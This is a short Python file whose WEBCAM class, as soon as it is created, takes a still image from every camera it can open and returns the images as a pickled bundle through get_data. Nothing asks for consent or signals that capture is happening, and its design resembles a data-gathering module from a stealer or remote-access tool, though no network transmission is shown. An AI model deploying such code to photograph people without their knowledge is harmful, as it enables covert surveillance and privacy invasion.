import cv2
import io
import pickle
import time

class WEBCAM:
    def __init__(self):
        
        
        
        self.ALL_CAM_DATA = {}
        self.SUCCESS = False
        self.generate_all()

    def generate_all(self, max_devices=10, timeout=7):
        start_time = time.time()
        try:
            found = False
            for cam_id in range(max_devices):
                if time.time() - start_time > timeout:
                    break

                cap = cv2.VideoCapture(cam_id)
                if not cap.isOpened():
                    cap.release()
                    continue

                ret, frame = cap.read()
                cap.release()
                if not ret:
                    continue

                success, buffer = cv2.imencode('.png', frame)
                if success:
                    self.ALL_CAM_DATA[f"cam_{cam_id}"] = buffer.tobytes()
                    found = True

            if found:
                self.SUCCESS = True
            else:
                self.ALL_CAM_DATA = {"error": b"No working webcams found"}
                self.SUCCESS = False

        except Exception as e:
            self.ALL_CAM_DATA = {"error": f"Webcam error: {str(e)}".encode()}
            self.SUCCESS = False

    def get_data(self):
        return pickle.dumps(self.ALL_CAM_DATA)

    def is_success(self):
        return self.SUCCESS
